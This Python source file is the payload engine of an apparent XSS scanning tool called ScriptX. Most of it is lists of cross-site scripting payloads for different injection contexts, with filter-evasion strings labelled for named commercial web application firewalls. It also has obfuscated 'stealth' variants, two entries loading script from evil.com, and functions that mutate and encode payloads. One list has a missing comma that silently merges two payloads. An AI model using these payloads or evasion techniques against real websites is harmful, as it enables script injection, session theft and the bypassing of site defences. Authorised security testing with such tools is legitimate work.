"""
ScriptX Payload Engine
Advanced XSS payload generation, mutation, and context-aware selection
"""

import random
import html
import urllib.parse
from typing import List, Dict, Optional, Set
from dataclasses import dataclass
from enum import Enum
import os
import re


class PayloadContext(Enum):
    """Context where payload will be injected"""
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    HTML_ATTRIBUTE_QUOTED = "html_attribute_quoted"
    HTML_ATTRIBUTE_UNQUOTED = "html_attribute_unquoted"
    JAVASCRIPT = "javascript"
    JAVASCRIPT_STRING = "javascript_string"
    URL = "url"
    CSS = "css"
    HTML_COMMENT = "html_comment"


@dataclass
class Payload:
    """XSS Payload with metadata"""
    raw: str
    category: str
    context: PayloadContext
    description: str = ""
    bypass_waf: bool = False


class PayloadEngine:
    """
    Advanced XSS payload management with:
    - Context-aware payload selection
    - Encoding/mutation capabilities
    - WAF bypass techniques
    - Custom payload loading
    """
    
    # Unique marker for detection
    XSS_MARKER = "SCRIPTX_XSS_"
    
    def __init__(self, custom_payloads_file: Optional[str] = None):
        self.custom_payloads_file = custom_payloads_file
        self._payload_counter = 0
        self._loaded_payloads: Dict[str, List[str]] = {}
        
        # Initialize payload categories
        self._init_payloads()
        
        # Load custom payloads if provided
        if custom_payloads_file and os.path.exists(custom_payloads_file):
            self._load_custom_payloads(custom_payloads_file)
    
    def _get_marker(self) -> str:
        """Generate unique marker for payload tracking"""
        self._payload_counter += 1
        return f"{self.XSS_MARKER}{self._payload_counter}"
    
    def _init_payloads(self):
        """Initialize built-in payload categories"""
        
        # ========== BASIC PAYLOADS ==========
        self.basic_payloads = [
            '<script>alert({marker})</script>',
            '<script>alert("{marker}")</script>',
            '<script>confirm({marker})</script>',
            '<script>prompt({marker})</script>',
            '<script src="data:,alert({marker})">',
            '<img src=x onerror=alert({marker})>',
            '<img src=x onerror="alert({marker})">',
            '<svg onload=alert({marker})>',
            '<svg/onload=alert({marker})>',
            '<body onload=alert({marker})>',
            '<input onfocus=alert({marker}) autofocus>',
            '<marquee onstart=alert({marker})>',
            '<video><source onerror=alert({marker})>',
            '<audio src=x onerror=alert({marker})>',
            '<details open ontoggle=alert({marker})>',
            '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert({marker})">click',
        ]
        
        # ========== EVENT HANDLER PAYLOADS ==========
        self.event_payloads = [
            '" onmouseover="alert({marker})"',
            "' onmouseover='alert({marker})'",
            '" onfocus="alert({marker})" autofocus="',
            "' onfocus='alert({marker})' autofocus='",
            '" onclick="alert({marker})"',
            '" onerror="alert({marker})"',
            '" onload="alert({marker})"',
            '" onmouseenter="alert({marker})"',
            "' onmouseenter='alert({marker})'",
            '" onanimationend="alert({marker})" style="animation:spin 1s"',
            '" ontransitionend="alert({marker})" style="transition:1s" ',
        ]
        
        # ========== SVG PAYLOADS ==========
        self.svg_payloads = [
            '<svg onload=alert({marker})>',
            '<svg/onload=alert({marker})>',
            '<svg><script>alert({marker})</script>',
            '<svg><animate onbegin=alert({marker}) attributeName=x>',
            '<svg><set onbegin=alert({marker}) attributename=x>',
            '<svg><handler type="text/javascript">alert({marker})</handler>',
            '<svg><animate onend=alert({marker}) dur=1s attributeName=x>',
            '<svg><image href=x onerror=alert({marker})>',
        ]
        
        # ========== ENCODED PAYLOADS ==========
        self.encoded_payloads = [
            # HTML Entity encoded
            '&lt;script&gt;alert({marker})&lt;/script&gt;',
            '&#x3c;script&#x3e;alert({marker})&#x3c;/script&#x3e;',
            '&#60;script&#62;alert({marker})&#60;/script&#62;',
            
            # Unicode encoded
            '<script>alert\u0028{marker}\u0029</script>',
            '\u003cscript\u003ealert({marker})\u003c/script\u003e',
            
            # Mixed encoding
            '<scr\x00ipt>alert({marker})</scr\x00ipt>',
            '<img src=x onerror=\u0061lert({marker})>',
        ]
        
        # ========== POLYGLOT PAYLOADS ==========
        self.polyglot_payloads = [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert({marker}) )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert({marker})//>\\x3e",
            "'\"-->]]>*/</script></style></title></textarea></noscript></template></select></xmp><!--<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert({marker})//'>"
            "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert({marker})//>",
            "<script>({marker})</script>",
            "'-alert({marker})-'",
            "\\'-alert({marker})-\\'",
        ]
        
        # ========== WAF BYPASS PAYLOADS ==========
        self.waf_bypass_payloads = [
            # Case variation
            '<ScRiPt>alert({marker})</sCrIpT>',
            '<SCRIPT>alert({marker})</SCRIPT>',
            '<scRipt>alert({marker})</scRipt>',
            
            # Tag manipulation
            '<scr<script>ipt>alert({marker})</scr</script>ipt>',
            '<<script>script>alert({marker})<</script>/script>',
            '<script >alert({marker})</script >',
            '<script\t>alert({marker})</script>',
            '<script\n>alert({marker})</script>',
            '<script/x>alert({marker})</script>',
            
            # Alternative tags
            '<img src=1 oNeRrOr=alert({marker})>',
            '<iMg src=x OnErRoR=alert({marker})>',
            '<dETAILS open onToGGLE=alert({marker})>',
            
            # Double encoding
            '%253Cscript%253Ealert({marker})%253C/script%253E',
            
            # Null bytes
            '<scri\x00pt>alert({marker})</scri\x00pt>',
            '<img src=x onerror\x00=alert({marker})>',
            
            # Comment injection
            '<script>/**/alert({marker})/**/</script>',
            '<script>/**\n**/alert({marker})/**\n**/</script>',
            
            # Unicode normalization bypass
            '<script>ａｌｅｒｔ({marker})</script>',  # Fullwidth characters
            
            # HTML5 specific
            '<svg><script href=data:,alert({marker})>',
            '<svg><script xlink:href=data:,alert({marker})>',
        ]
        
        # ========== DOM XSS PAYLOADS ==========
        self.dom_payloads = [
            # Source: location.hash
            '#<script>alert({marker})</script>',
            '#<img src=x onerror=alert({marker})>',
            '#"><script>alert({marker})</script>',
            '#\'-alert({marker})-\'',
            
            # Source: location.search  
            '?q=<script>alert({marker})</script>',
            '?search="><script>alert({marker})</script>',
            '?id=\'-alert({marker})-\'',
            
            # JavaScript context
            '\';alert({marker});//',
            '";alert({marker});//',
            '\\\';alert({marker});//',
            '</script><script>alert({marker})</script>',
            
            # Template literals
            '${alert({marker})}',
            '`${alert({marker})}`',
        ]
        
        # ========== ATTRIBUTE CONTEXT PAYLOADS ==========
        self.attribute_payloads = [
            # Breaking out of attributes
            '"><script>alert({marker})</script>',
            "'><script>alert({marker})</script>",
            '"><img src=x onerror=alert({marker})>',
            "'><img src=x onerror=alert({marker})>",
            '" onmouseover=alert({marker}) x="',
            "' onmouseover=alert({marker}) x='",
            
            # Without quotes
            ' onmouseover=alert({marker})',
            ' onfocus=alert({marker}) autofocus ',
            
            # JavaScript URI
            'javascript:alert({marker})',
            'javascript&#58;alert({marker})',
            'java\nscript:alert({marker})',
            'java\tscript:alert({marker})',
            ' javascript:alert({marker})',
            
            # Data URI
            'data:text/html,<script>alert({marker})</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        ]
        
        # ========== JAVASCRIPT CONTEXT PAYLOADS ==========
        self.js_context_payloads = [
            # String escapes
            '\';alert({marker});//',
            '";alert({marker});//',
            '`};alert({marker});//',
            
            # Breaking string
            '</script><script>alert({marker})</script>',
            '\\x3c/script\\x3e\\x3cscript\\x3ealert({marker})\\x3c/script\\x3e',
            
            # Expression injection
            '-alert({marker})-',
            '+alert({marker})+',
            '/alert({marker})/',
            
            # Template literal
            '${alert({marker})}',
            '`+alert({marker})+`',
            
            # Arrow function
            '=>{alert({marker})}',
            '=>alert({marker})',
        ]
        
        # ========== SPECIAL CHARACTER PAYLOADS ==========
        self.special_char_payloads = [
            # Angle bracket alternatives
            '＜script＞alert({marker})＜/script＞',  # Fullwidth
            '‹script›alert({marker})‹/script›',  # Single angle quotation
            
            # Quote alternatives
            '`onerror=alert({marker})`',
            
            # Whitespace bypass
            '<svg\x0Conload=alert({marker})>',
            '<svg\x0Donload=alert({marker})>',
            '<svg\x09onload=alert({marker})>',
            '<svg\x0Aonload=alert({marker})>',
        ]
        
        # ========== ADVANCED WAF BYPASS PAYLOADS ==========
        self.advanced_waf_bypass = [
            # ===== CLOUDFLARE BYPASSES =====
            '<svg onload=alert&#x28;{marker}&#x29;>',
            '<svg onload=alert&#40;{marker}&#41;>',
            '<a href="javascript&colon;alert({marker})">click</a>',
            '<svg><script>/<@/>alert({marker})</script>',
            '<svg><script>alert&lpar;{marker}&rpar;</script>',
            '"><img src=x id=alert({marker}) onerror=eval(id)>',
            '<svg><animate onbegin=alert({marker}) attributeName=x dur=1s>',
            '<math><maction actiontype=statusline#http://x xlink:href=javascript:alert({marker})>click',
            '<form><button formaction=javascript:alert({marker})>X</button>',
            '<isindex action="javascript:alert({marker})" type=submit value=click>',
            
            # ===== AKAMAI BYPASSES =====
            '"><<script>alert({marker})//<</script>',
            '<x onclick=alert({marker})>click me',
            '<svg/onload=\u0061lert({marker})>',
            '<svg/onload=&#x61;lert({marker})>',
            '<body/onload=alert({marker})>',
            '<input type=image src=x onerror=alert({marker})>',
            '"><svg/onload=alert({marker})//',
            '<x contenteditable onblur=alert({marker})>lose focus',
            '<marquee onstart=alert({marker})>',
            '<menu id=x contextmenu=x onshow=alert({marker})>right click',
            
            # ===== MODSECURITY BYPASSES =====
            '<object data="data:text/html,<script>alert({marker})</script>">',
            '<object data="javascript:alert({marker})">',
            '<embed src="data:text/html,<script>alert({marker})</script>">',
            '<embed code="javascript:alert({marker})">',
            '<applet code="javascript:alert({marker})"></applet>',
            '<frame src="javascript:alert({marker})">',
            '<frameset><frame src="javascript:alert({marker})">',
            '<base href="javascript:alert({marker})//">',
            
            # ===== SUCURI BYPASSES =====
            '"><img src=x:alert onerror=eval(src.slice(2))>',
            '"><img src=1 onerror="[].sort.call`${alert}{${marker}}`">',
            '<form id=f action=javascript:alert({marker})><input><button>click</button>',
            '"></script><script>alert({marker})</script>',
            '<svg><set onbegin=alert({marker}) attributename=x>',
            '<svg><discard onbegin=alert({marker})>',
            '<svg/onload=eval(atob`YWxlcnQoe21hcmtlcn0p`)>',  # Base64 alert
            
            # ===== IMPERVA/INCAPSULA BYPASSES =====
            '"><img src=x onerror="Function`a]={alert\x28{marker}\x29}``.constructor``.call``">',
            '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend=alert({marker})>',
            '<style>*{color:expression(alert({marker}))}</style>',  # IE only
            '"><a autofocus onfocus=alert({marker})>>',
            '<keygen autofocus onfocus=alert({marker})>',
            '<video><source onerror=alert({marker})>',
            '<video poster=javascript:alert({marker})//></video>',
            '<iframe src="javascript:alert({marker})">',
            '<iframe srcdoc="<script>alert(parent.{marker})</script>">',
            
            # ===== AWS WAF BYPASSES =====
            '<img src=x onerror=alert({marker})//a>',
            '<img src=x onerror=confirm({marker})//a>',
            '<svg onload=prompt({marker})//a>',
            '<body onpageshow=alert({marker})>',
            '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert({marker})</script></svg>#x">',
            '"><input onfocus=alert({marker}) autofocus="">',
            '<select onfocus=alert({marker}) autofocus>',
            '<textarea onfocus=alert({marker}) autofocus>',
            
            # ===== MUTATION XSS (mXSS) =====
            '<noscript><p title="</noscript><img src=x onerror=alert({marker})>">',
            '<title><img src=x onerror=alert({marker})></title>',
            '<style><style/><script>alert({marker})</script>',
            '<noembed><noembed/><script>alert({marker})</script>',
            '<template><img src=x onerror=alert({marker})></template>',
            '<xmp><script>alert({marker})</script></xmp>',
            '<plaintext><script>alert({marker})</script>',
            '<listing><script>alert({marker})</script></listing>',
            
            # ===== ENCODING BYPASSES =====
            '<script>alert({marker})\u2028</script>',  # Line separator
            '<script>alert({marker})\u2029</script>',  # Paragraph separator  
            '<script>\u0061\u006c\u0065\u0072\u0074({marker})</script>',  # Unicode
            '<script>\\u0061\\u006c\\u0065\\u0072\\u0074({marker})</script>',
            '<img src=x onerror=\\u0061lert({marker})>',
            '<img src=x onerror=al\\u0065rt({marker})>',
            '<svg/onload=&#97;&#108;&#101;&#114;&#116;({marker})>',  # Decimal entities
            '<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;({marker})>',  # Hex entities
            
            # ===== OBFUSCATION TECHNIQUES =====
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,{marker},41))</script>',
            '<script>eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))</script>',  # Base64
            '<script>[]["filter"]["constructor"]("alert({marker})")()</script>',
            '<script>Reflect.apply(alert,null,[{marker}])</script>',
            '<script>(alert)({marker})</script>',
            '<script>alert?.({marker})</script>',  # Optional chaining
            '<script>alert`{marker}`</script>',  # Tagged template
            '<script>window["al"+"ert"]({marker})</script>',
            '<script>this["al"+"ert"]({marker})</script>',
            '<script>self["al"+"ert"]({marker})</script>',
            '<script>top["al"+"ert"]({marker})</script>',
            '<script>parent["al"+"ert"]({marker})</script>',
            '<script>frames["al"+"ert"]({marker})</script>',
            '<script>globalThis["al"+"ert"]({marker})</script>',
            
            # ===== PROTOTYPE POLLUTION XSS =====
            '<script>Object.prototype.onerror=alert;Object.prototype.src="x";</script><img>',
            '<script>Object.prototype.innerHTML="<img src=x onerror=alert({marker})>";</script>',
            
            # ===== CONTENT-TYPE CONFUSION =====
            '<script type="text/plain">alert({marker})</script>',
            '<script type="application/ecmascript">alert({marker})</script>',
            '<script language="vbscript">alert({marker})</script>',  # IE only
            
            # ===== EVENT HANDLER VARIATIONS =====
            '<body onafterprint=alert({marker})>',
            '<body onbeforeprint=alert({marker})>',
            '<body onbeforeunload=alert({marker})>',
            '<body onhashchange=alert({marker})>',
            '<body onoffline=alert({marker})>',
            '<body ononline=alert({marker})>',
            '<body onpagehide=alert({marker})>',
            '<body onpopstate=alert({marker})>',
            '<body onresize=alert({marker})>',
            '<body onstorage=alert({marker})>',
            '<input onauxclick=alert({marker})>',
            '<div onwheel=alert({marker})>scroll</div>',
            '<div oncopy=alert({marker})>copy this</div>',
            '<div oncut=alert({marker})>cut this</div>',
            '<div onpaste=alert({marker})>paste here</div>',
            
            # ===== RARE/EXOTIC TAGS =====
            '<xss onclick=alert({marker})>click',
            '<custom onclick=alert({marker})>click',
            '<a:b onclick=alert({marker})>click',
            '<_:svg onload=alert({marker})>',
            '<?xml-stylesheet href="javascript:alert({marker})"?>',
            '<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert({marker})</handler></svg>',
            
            # ===== CSP BYPASS ATTEMPTS =====
            "<script nonce=''>alert({marker})</script>",
            "<script src='//evil.com/xss.js'></script>",
            "<link rel=preload href=//evil.com/xss.js as=script>",
            "<meta http-equiv='refresh' content='0;url=javascript:alert({marker})'>",
            "<meta http-equiv='Set-Cookie' content='xss=<script>alert({marker})</script>'>",
            
            # ===== SRCDOC/BLOB INJECTION =====
            '<iframe srcdoc="&#60;script&#62;alert({marker})&#60;/script&#62;">',
            '<iframe srcdoc="&lt;script&gt;alert({marker})&lt;/script&gt;">',
            
            # ===== ANGULARJS/VUE/REACT BYPASSES =====
            '{{constructor.constructor("alert({marker})")()}}',  # AngularJS
            '{{$on.constructor("alert({marker})")()}}',
            '{{"a]]{constructor.constructor("alert({marker})")()}}',
            '[[constructor.constructor("alert({marker})")()]]',
            '<div ng-app ng-csp>{{$eval.constructor("alert({marker})")()}}</div>',
            '<div v-show="alert({marker})">',  # Vue.js
        ]
        
        # ========== STEALTH PAYLOADS (WAF Evasion) ==========
        # These avoid common XSS keywords that WAFs look for
        self.stealth_payloads = [
            # ===== NO-KEYWORD PAYLOADS (Avoid: script, alert, onerror, etc.) =====
            '<img src=x oneonerrorrror=top[`al`+`ert`]({marker})>',  # Split keywords
            '<img src=1 onerror=window[`\\x61lert`]({marker})>',  # Hex escape
            '<svg onload=self[`\\u0061lert`]({marker})>',  # Unicode escape
            '<body onpageshow=this[`al`+`ert`]({marker})>',
            '<input onfocus=parent[`al`+`ert`]({marker}) autofocus>',
            '<marquee onstart=frames[`al`+`ert`]({marker})>',
            
            # ===== HEAVY ENCODING (Multiple layers) =====
            '<img src=x onerror=&#x5b;&#x5d;&#x5b;&#x27;map&#x27;&#x5d;&#x5b;&#x27;constructor&#x27;&#x5d;&#x28;&#x27;alert({marker})&#x27;&#x29;&#x28;&#x29;>',
            '<svg onload=&#97&#108&#101&#114&#116&#40&#49&#41>',  # Decimal without semicolons
            '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;{marker}&#41;">x</a>',
            '"><img src=x onerror="&#x5b;&#x5d;.constructor.constructor(&#x27;al&#x27;+&#x27;ert({marker})&#x27;)()">',
            
            # ===== FUNCTION CONSTRUCTOR TRICKS =====
            '<img src=x onerror=[].map.constructor`a]={_:new/**/Function`al\\x65rt({marker})`}`._.call`1`>',
            '<svg onload=Function(`al\\x65rt({marker})`)()>',
            '<svg onload=new/**/Function`al\\x65rt%28{marker}%29`()>',
            '<svg onload=Function.call`${"ale"+"rt({marker})"}`()>',
            '<img src=x onerror=Reflect.construct(Function,["ale"+"rt({marker})"])()>',
            
            # ===== SETTIMEOUT/SETINTERVAL (Delayed execution) =====
            '<img src=x onerror=setTimeout`ale\\x72t\\x28{marker}\\x29`>',
            '<img src=x onerror=setInterval(Function(`al\\x65rt({marker})`))>',
            '<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))>',
            '<body onload=setTimeout(`al`+`ert({marker})`)>',
            
            # ===== EVAL ALTERNATIVES =====
            '<svg onload=location=`javas`+`cript:al`+`ert({marker})`>',
            '<img src=x onerror=location.href=`javascript:al`+`ert({marker})`>',
            '<a id=x tabindex=1 onfocus=location=`java`+`script:al`+`ert({marker})`></a>',
            '<svg onload=location.assign(`javas`+`cript:ale`+`rt({marker})`)>',
            '<img src=x onerror=open(`javas`+`cript:ale`+`rt({marker})`)>',
            
            # ===== ATOB/BTOA BASE64 EXECUTION =====
            '<svg onload=eval(atob(`YWxlcnQoMSk=`))>',  # alert(1) in base64
            '<img src=x onerror=Function(atob`YWxlcnQoMSk=`)()>',
            '<svg onload=setTimeout(atob`YWxlcnQoMSk=`)>',
            '<img src=x onerror=[].constructor.constructor(atob`YWxlcnQoMSk=`)()>',
            
            # ===== DOCUMENT.WRITE EXECUTION =====
            '<img src=x onerror=document.write`<img/src=x onerror=al\\x65rt({marker})>`>',
            '<svg onload=document.body.innerHTML+=`<img/src=x onerror=al\\x65rt({marker})>`>',
            
            # ===== REGEX CONSTRUCTOR =====
            '<svg onload=/./[`constructor`][`constructor`]`al\\x65rt({marker})`()>',
            '<img src=x onerror="/./.constructor.constructor(`al\\x65rt({marker})`)()">',
            
            # ===== ARRAY METHODS =====
            '<svg onload=[1].find(Function`al\\x65rt({marker})`)>',
            '<svg onload=[1].map(Function`al\\x65rt({marker})`)>',
            '<svg onload=[1].filter(Function`al\\x65rt({marker})`)>',
            '<svg onload=[1].forEach(Function`al\\x65rt({marker})`)>',
            '<svg onload=[1].reduce(Function`al\\x65rt({marker})`)>',
            '<svg onload=[1].some(Function`al\\x65rt({marker})`)>',
            '<svg onload=[1].every(Function`al\\x65rt({marker})`)>',
            
            # ===== SYMBOL/PROXY TRICKS =====
            '<img src=x onerror=Symbol.prototype.valueOf.call(Function`al\\x65rt({marker})`)()>',
            
            # ===== IMPORT/DYNAMIC IMPORT =====
            '<script type=module>import(`data:text/javascript,al`+`ert({marker})`)</script>',
            
            # ===== CSS INJECTION (for older browsers) =====
            '<style>*{background:url("javascript:alert({marker})")}</style>',
            '<div style="background:url(javascript:alert({marker}))">',
            '<div style="-moz-binding:url(javascript:alert({marker}))">',
            
            # ===== HEADER INJECTION STYLE =====
            '%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert({marker})</script>',
            
            # ===== DOUBLE ENCODING =====
            '%253Cscript%253Ealert({marker})%253C/script%253E',
            '%25253Cscript%25253Ealert({marker})%25253C/script%25253E',  # Triple
            
            # ===== NULL BYTE INJECTION =====
            '<scr%00ipt>alert({marker})</scr%00ipt>',
            '<scr\\x00ipt>alert({marker})</scr\\x00ipt>',
            '<scr\x00ipt>alert({marker})</scr\x00ipt>',
            
            # ===== UNICODE NORMALIZATION =====
            '<ſcript>alert({marker})</ſcript>',  # Long S character
            '<img ſrc=x onerror=alert({marker})>',
            '﹤script﹥alert({marker})﹤/script﹥',  # Small angle brackets
            
            # ===== COMMENT ABUSE =====
            '<!--><script>alert({marker})//--></script>',
            '<script><!--alert({marker})//--></script>',
            '<!--<script>-->alert({marker})<!--</script>-->',
            
            # ===== TAB/NEWLINE INJECTION =====
            '<scr\tipt>alert({marker})</scr\tipt>',
            '<scr\nipt>alert({marker})</scr\nipt>',
            '<scr\ript>alert({marker})</scr\ript>',
            '<a hr\tef="javascript:alert({marker})">x</a>',
            '<a hr\nef="javascript:alert({marker})">x</a>',
            
            # ===== MINIMAL PAYLOADS (Smallest footprint) =====
            "'-alert({marker})-'",
            '"-alert({marker})-"',
            '`;alert({marker})//`',
            '${alert({marker})}',
            '*/{alert({marker})}/*',
            
            # ===== EVENT WITHOUT CLOSING =====
            '<svg onload=alert({marker})',
            '<img src=x onerror=alert({marker})',
            '<body onload=alert({marker})',
            
            # ===== HTML5 ENTITY BYPASS =====
            '<a href="java&NewLine;script&colon;alert({marker})">X</a>',
            '<a href="java&Tab;script&colon;alert({marker})">X</a>',
            '<a href="java&#x0A;script:alert({marker})">X</a>',
            '<a href="java&#x0D;script:alert({marker})">X</a>',
            '<a href="java&#x09;script:alert({marker})">X</a>',
            
            # ===== DATA URI WITH ENCODING =====
            '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">X</a>',
            '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
            '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
            '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
            
            # ===== BLOB URL EXECUTION =====
            '<script>location=URL.createObjectURL(new Blob([`<script>alert({marker})<\\/script>`],{type:`text/html`}))</script>',
        ]
    
    def _load_custom_payloads(self, filepath: str):
        """Load custom payloads from file"""
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            self._loaded_payloads['custom'] = payloads
        except Exception as e:
            print(f"Warning: Could not load custom payloads: {e}")
    
    def get_payloads(self, context: PayloadContext = None, 
                     include_waf_bypass: bool = True,
                     max_payloads: int = None) -> List[str]:
        """
        Get payloads for a specific context.
        Returns payloads with unique markers.
        """
        payloads = []
        
        if context is None or context == PayloadContext.HTML_BODY:
            payloads.extend(self.basic_payloads)
            payloads.extend(self.svg_payloads)
            payloads.extend(self.polyglot_payloads)
        
        if context in (None, PayloadContext.HTML_ATTRIBUTE, 
                       PayloadContext.HTML_ATTRIBUTE_QUOTED,
                       PayloadContext.HTML_ATTRIBUTE_UNQUOTED):
            payloads.extend(self.attribute_payloads)
            payloads.extend(self.event_payloads)
        
        if context in (None, PayloadContext.JAVASCRIPT, PayloadContext.JAVASCRIPT_STRING):
            payloads.extend(self.js_context_payloads)
            payloads.extend(self.dom_payloads)
        
        if context in (None, PayloadContext.URL):
            payloads.extend(self.attribute_payloads)
        
        if include_waf_bypass:
            payloads.extend(self.waf_bypass_payloads)
            payloads.extend(self.advanced_waf_bypass)  # Include advanced bypasses
            payloads.extend(self.stealth_payloads)  # Include stealth payloads
            payloads.extend(self.encoded_payloads)
            payloads.extend(self.special_char_payloads)
        
        # Add custom payloads
        if 'custom' in self._loaded_payloads:
            payloads.extend(self._loaded_payloads['custom'])
        
        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)
        
        # Replace marker placeholder with unique marker
        result = []
        for p in unique_payloads:
            marker = self._get_marker()
            result.append(p.replace('{marker}', marker))
        
        if max_payloads:
            result = result[:max_payloads]
        
        return result
    
    def get_all_payloads(self, max_payloads: int = None) -> List[str]:
        """Get all payloads from all categories"""
        return self.get_payloads(context=None, include_waf_bypass=True, max_payloads=max_payloads)
    
    def encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload using specified encoding"""
        encodings = {
            'url': lambda p: urllib.parse.quote(p),
            'url_double': lambda p: urllib.parse.quote(urllib.parse.quote(p)),
            'html': lambda p: html.escape(p),
            'html_dec': lambda p: ''.join(f'&#{ord(c)};' for c in p),
            'html_hex': lambda p: ''.join(f'&#x{ord(c):x};' for c in p),
            'unicode': lambda p: ''.join(f'\\u{ord(c):04x}' for c in p),
            'base64': lambda p: __import__('base64').b64encode(p.encode()).decode(),
        }
        
        encoder = encodings.get(encoding)
        if encoder:
            return encoder(payload)
        return payload
    
    def mutate_payload(self, payload: str) -> List[str]:
        """Generate mutations of a payload"""
        mutations = [payload]
        
        # Case variations
        mutations.append(payload.lower())
        mutations.append(payload.upper())
        mutations.append(self._random_case(payload))
        
        # Whitespace variations
        mutations.append(payload.replace(' ', '\t'))
        mutations.append(payload.replace(' ', '\n'))
        mutations.append(payload.replace(' ', '  '))
        
        # Encoding variations
        mutations.append(self.encode_payload(payload, 'url'))
        mutations.append(self.encode_payload(payload, 'html'))
        
        # Tag variations
        if '<script>' in payload.lower():
            mutations.append(payload.replace('<script>', '<script >'))
            mutations.append(payload.replace('<script>', '<script\t>'))
            mutations.append(payload.replace('<script>', '<script/x>'))
        
        return list(set(mutations))
    
    def _random_case(self, text: str) -> str:
        """Randomize case of alphabetic characters"""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in text
        )
    
    def get_context_specific_payloads(self, reflected_value: str, 
                                       response_content: str) -> List[str]:
        """
        Analyze where a probe value is reflected and return context-specific payloads.
        """
        context = self._detect_context(reflected_value, response_content)
        return self.get_payloads(context=context)
    
    def _detect_context(self, value: str, content: str) -> PayloadContext:
        """Detect the context where value is reflected"""
        if value not in content:
            return PayloadContext.HTML_BODY
        
        pos = content.find(value)
        before = content[max(0, pos-200):pos]
        after = content[pos+len(value):pos+len(value)+50]
        
        # Check for JavaScript context
        if re.search(r'<script[^>]*>[^<]*$', before, re.IGNORECASE):
            # Inside script tag
            if re.search(r'["\'][^"\']*$', before):
                return PayloadContext.JAVASCRIPT_STRING
            return PayloadContext.JAVASCRIPT
        
        # Check for attribute context
        attr_pattern = r'[\w-]+\s*=\s*["\']?[^"\'<>]*$'
        if re.search(attr_pattern, before):
            if before.rstrip().endswith('"'):
                return PayloadContext.HTML_ATTRIBUTE_QUOTED
            elif before.rstrip().endswith("'"):
                return PayloadContext.HTML_ATTRIBUTE_QUOTED
            return PayloadContext.HTML_ATTRIBUTE_UNQUOTED
        
        # Check for URL context
        if re.search(r'(?:href|src|action)\s*=\s*["\'][^"\']*$', before, re.IGNORECASE):
            return PayloadContext.URL
        
        # Check for HTML comment
        if '<!--' in before and '-->' not in before[before.rfind('<!--'):]:
            return PayloadContext.HTML_COMMENT
        
        return PayloadContext.HTML_BODY
    
    def get_quick_payloads(self) -> List[str]:
        """Get a minimal set of high-success-rate payloads for quick scanning"""
        quick = [
            '<script>alert({marker})</script>',
            '<img src=x onerror=alert({marker})>',
            '<svg onload=alert({marker})>',
            '"><script>alert({marker})</script>',
            "'-alert({marker})-'",
            '" autofocus onfocus=alert({marker})//="',
        ]
        
        result = []
        for p in quick:
            marker = self._get_marker()
            result.append(p.replace('{marker}', marker))
        
        return result
    
    def extract_marker(self, text: str) -> Optional[str]:
        """Extract ScriptX marker from text"""
        match = re.search(r'SCRIPTX_XSS_\d+', text)
        return match.group(0) if match else None
    
    def payload_contains_marker(self, text: str) -> bool:
        """Check if text contains a ScriptX marker"""
        return bool(re.search(r'SCRIPTX_XSS_\d+', text))
